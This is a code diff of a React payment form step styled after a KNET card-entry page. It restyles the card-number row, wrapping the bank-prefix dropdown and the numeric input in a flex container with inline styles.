@@ -213,27 +213,28 @@ function Step1({ paymentInfo, setPaymentInfo }) {
 
       <div className="knet-row knet-three-col">
         <label className="knet-col-label">Card Number:</label>
-        <select
-          className="knet-col-value"
-          value={paymentInfo.prefix}
-          onChange={e => setPaymentInfo(p => ({ ...p, prefix: e.target.value }))}
-        >
-          <option value="i">prefix</option>
-          {paymentInfo.bank_card.map((pfx, i) => (
-            <option key={i} value={pfx}>{pfx}</option>
-          ))}
-        </select>
-        <input
-          type="tel"
-          inputMode="numeric"
-          pattern="[0-9]*"
-          maxLength={10}
-          value={paymentInfo.cardNumber}
-          onChange={e => setPaymentInfo(p => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
-          className="knet-col-long"
-          placeholder="0000000000"
-          style={{ width: "38%", marginLeft: 5 }}
-        />
+        <div style={{ float: "left", width: "58%", display: "flex", gap: 4 }}>
+          <select
+            style={{ width: "42%", fontSize: 11, height: 22, color: "#444", border: "1px solid #ccc" }}
+            value={paymentInfo.prefix}
+            onChange={e => setPaymentInfo(p => ({ ...p, prefix: e.target.value }))}
+          >
+            <option value="i">prefix</option>
+            {paymentInfo.bank_card.map((pfx, i) => (
+              <option key={i} value={pfx}>{pfx}</option>
+            ))}
+          </select>
+          <input
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            maxLength={10}
+            value={paymentInfo.cardNumber}
+            onChange={e => setPaymentInfo(p => ({ ...p, cardNumber: e.target.value.replace(/\D/g, "") }))}
+            placeholder="0000000000"
+            style={{ width: "58%", border: "2px solid #0070cd", boxShadow: "inset 0 0 5px rgba(0,0,0,0.2)", padding: "0 4px", fontSize: 11, height: 22, color: "#444", boxSizing: "border-box" }}
+          />
+        </div>
       </div>
 
       <div className="knet-row knet-three-col">
